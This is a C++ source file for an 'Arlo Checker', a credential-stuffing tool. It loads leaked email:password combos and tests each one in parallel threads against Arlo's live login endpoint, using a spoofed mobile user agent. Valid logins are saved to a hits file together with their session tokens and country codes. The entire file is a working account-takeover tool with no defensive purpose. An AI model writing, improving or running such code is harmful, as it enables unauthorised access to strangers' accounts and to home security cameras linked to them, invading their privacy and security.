#include <cpr/cpr.h>
#include <nlohmann/json.hpp>

#include <fstream>
#include <iostream>
#include <mutex>
#include <string>
#include <vector>


std::atomic<int> checked = 0;
std::atomic<int> valid = 0;
std::vector<std::string> accounts;
std::atomic<int> activeThreads;
std::mutex mutex;


void validityCheck(std::string credentials) {
    activeThreads++;

    std::string email = credentials.substr(0, credentials.find(":"));
    std::string password = credentials.substr(credentials.find(":") + 1);

    cpr::Response response = cpr::Post(
        cpr::Url("https://my.arlo.com/hmsweb/login/v2"),
        cpr::Body{ std::string{ "{\"email\":\"" } + email + std::string{ "\",\"password\":\"" } + password + std::string{ "\"}" } },
        cpr::Header{ { "Content-Type", "application/json" }, { "DNT" , "1" }, { "schemaVersion", "1" }, { "Host", "my.arlo.com" }, { "Referer", "https://my.arlo.com/" }, { "User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_2 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B202 NETGEAR/v1 (iOS Vuezone)" } }
    );
    switch (response.status_code) {
    case 401:
        checked++;
        break;
    case 200:
    {
        checked++;
        valid++;
        nlohmann::json data = nlohmann::json::parse(response.text);
        std::string token = data["data"]["token"];
        std::string countryCode = data["data"]["countryCode"];
        // int dateCreated = data["data"]["dateCreated"];

        mutex.lock();

        std::ofstream file;
        file.open("hits.txt", std::ios::app);
        file << email << ':' << password << " | Country: " << countryCode << " | Token: " << token << '\n';
        file.close();
        std::cout << email << ':' << password << " | Country: " << countryCode << '\n';

        mutex.unlock();
        break;
    }
    default:
        mutex.lock();
        std::cout << response.status_code << ' ' << response.text << '\n';
        mutex.unlock();
        break;
    }

    activeThreads--;
}

void titleUpdater() {
    while (true) {
        system((std::string{ "title Arlo Checker ^| Checked: " } + std::to_string(checked) + std::string{ '/' } + std::to_string(accounts.size()) + std::string{ " — Valid: " } + std::to_string(valid)).c_str());
        if (checked == accounts.size())
            break;
    }
}

int main() {
    // Clears console and turns foreground color white.
    system("cls && color f");

    std::fstream file;
    file.open("combos.txt");

    if (file.is_open()) {
        std::string account;

        // Adds each line to vector.
        while (getline(file, account))
            accounts.push_back(std::move(account));
        file.close();

        std::cout << ">> Max threads: ";
        int maxThreads;
        std::cin >> maxThreads;

        std::thread titleThread(titleUpdater);
        std::vector<std::thread> threads;

        // Starts threads.
        for (std::string i : accounts) {
            while (true) {
                if (activeThreads < maxThreads) {
                    std::thread checkingThread(validityCheck, i);
                    threads.push_back(std::move(checkingThread));
                    break;
                }
            }
        }

        // Eventually joins active threads if available.
        for (std::thread& t : threads) {
            if (t.joinable())
                t.join();
        }
        if (titleThread.joinable())
            titleThread.join();

        std::cout << "\n> Finished.\n";
    } else {
        std::cout << "> combos.txt not found.\n";
        std::ofstream open("combos.txt");
    }

    system("pause >NUL");
    return 0;
}
